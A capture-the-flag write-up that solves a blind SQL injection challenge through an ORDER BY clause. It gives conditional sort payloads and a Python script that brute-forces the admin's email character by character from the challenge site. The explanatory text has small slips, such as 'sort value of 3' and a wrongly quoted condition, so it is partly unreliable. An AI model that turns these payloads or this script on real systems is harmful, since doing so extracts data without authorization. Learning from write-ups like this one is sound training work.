---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 23
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/50a38bf9-d127-4ab6-ad25-321eb0130c99)

We are provided with the SQL query:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY {$_GET[order]}
```

This challenge returns the output in the form of a table.

If we provide the following URI parameter:

```
?order=id
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY id
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/a1e61aae-d070-4cea-b385-c1e6cd9195fb)

There are two users: `admin` and `rubiya`.

We can solve this challenge using two different methods:
1. Assigning sort value
2. Sorting by different columns

## Blind SQL Injection - (Assigning different sort value)

In this method, we will assign a sort value to the result that we want.

### Retrieving the email length

If we provide the following URI parameter:

```
?order=if(id='admin' AND length(email)=1, 1, 2)
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=num, 1, 2)
```

Rows where `id='admin'` and `length(email)=1` will be given a sort value of 1 and will appear first. All other rows will be given a sort value of 3 and will appear afterwards.

![3](https://github.com/Kunull/Write-ups/assets/110326359/69eee14a-1f35-4577-a4bf-794968d7b3c0)

Since the `admin` user is not sorted first, it means that `id='admin' AND length(email)=1` did not result in `True`. This tells us that the email length is greater than 1.

We can move onto greater values:

```
?order=if(id='admin' AND length(email)=28, 1, 2)
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=28, 1, 2)
```

![4](https://github.com/Kunull/Write-ups/assets/110326359/3fb5f2f3-0632-4a05-9710-787bed3e5706)

Since the `admin` user is sorted first, it means that `id='admin' AND length(email)=1` resulted in `True`. This tells us that the email length is 28.
### Leaking the password

If we provide the following URI parameter:

```
?order=if(id='admin' AND substr(email, 1, 1)='0', 1, 2)
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND substr(email, 1, 1)='0', 1, 2)
```

Rows where `id='admin'` and `length(email)=1` will be given a sort value of 1 and will appear first. All other rows will be given a sort value of 3 and will appear afterwards.

![6](https://github.com/Kunull/Write-ups/assets/110326359/2c496b75-0a47-4745-8587-13851ba99c00)

Since the `admin` user is not sorted first, it means that `id='admin' AND substr(email, 1, 1)='0'` did not result in `True`. This tells us that the first character of the email is not `0`.

We can move onto other characters:

```
?order=if(id='admin' AND substr(email, 1, 1)='a', 1, 2)
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND substr(email, 1, 1)='a', 1, 2)
```

![[7 74.png]]

Since the `admin` user is first, it means that `id='admin' AND substr(email, 1, 1)='0'` resulted in `True`. This tells us that the first character of the email is `a`.

We can leak out all 28 character this way.

```
admin_secure_email@emai1.com
```
### Script

We can automate this process using a script. Since `_` and `.` are filtered out, we will have to convert these characters into their ASCII representation using the `ord()` function.

```python title="hell_fire_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'fgpbvjdctvq3qasns4lba8a85p'}
url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
password_length = 0

for x in range(0, 100):
  payload = f"if(id='admin' and length(email)={x}, 1, 2)"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?order={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "<table border=1><tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td>" in response.text:
    password_length = x
    break

print()    
print(f"[!] Payload: ?order={payload}")
print(f"[!] Payload (URL encoded): ?order={encoded_payload}")
print(f"[!] Email length: {password_length}")

password = ""
searchspace = '_@.' +  string.digits + string.ascii_letters

print(searchspace)

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"if(id='admin' AND ord(substr(email, {index}, 1))='{ord(char)}', 1, 2)"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?order={encoded_payload}"

    response = requests.get(full_url, cookies=cookies)

    if "<table border=1><tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td>" in response.text:
      password += char
      print()
      print(f"[+] Payload: ?order={payload}")
      print(f"[+] Payload (URL encoded): ?order={encoded_payload}")
      print(f"[+] Character at index {index}: {char}")
      break

print()
print(f"[!] Extracted email: {password}")
print(f"[!] Final payload: ?email={password}")
```


```
admin%5Fsecure%5Femail@emai1.com
```
